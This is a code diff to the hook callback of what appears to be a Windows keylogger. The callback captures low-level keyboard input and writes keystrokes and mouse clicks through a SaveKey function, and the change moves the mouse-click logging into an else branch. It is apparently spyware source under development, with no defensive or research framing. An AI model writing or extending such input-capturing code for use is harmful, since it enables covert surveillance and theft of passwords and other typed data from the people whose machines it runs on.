@@ -38,24 +38,7 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
         //PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam); // Contains information about a low-level keyboard input event.
         kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);    //  // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.  
 
-
-       /* switch (wParam) {
-        case WM_LBUTTONDOWN:  SaveKey("KEYMOUSE"); break;
-        case WM_RBUTTONDOWN: puts("WM_RBUTTONDOWN"); break;
-        }*/
-
-        switch (wParam)
-        {
-           case WM_LBUTTONDOWN: SaveKey("<L_MOUSE>"); break;
-           case WM_RBUTTONDOWN: SaveKey("<R_MOUSE>"); break;
-           case WM_MBUTTONDOWN: SaveKey("<M_MOUSE>"); break;
-           case WM_MOUSEWHEEL: SaveKey("<MOUSE_WHEEL>"); break;
-        
-           default:
-            break;
-        }
-
-
+          
         if (kbdStruct.vkCode != 0)
         {
                if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
@@ -131,7 +114,21 @@ LRESULT CALLBACK LowLevelHook(int nCode, WPARAM wParam, LPARAM lParam)
                        }
                    }
                }
+               else
+               {
+                   switch (wParam)
+                   {
+                   case WM_LBUTTONDOWN: SaveKey("<L_MOUSE>"); break;
+                   case WM_RBUTTONDOWN: SaveKey("<R_MOUSE>"); break;
+                   case WM_MBUTTONDOWN: SaveKey("<M_MOUSE>"); break;
+                   case WM_MOUSEWHEEL: SaveKey("<MOUSE_WHEEL>"); break;
+
+                   default:
+                       break;
+                   }
+               }
         }
+       
     }
     return CallNextHookEx(keyboard_hHock, nCode, wParam, lParam);
 }
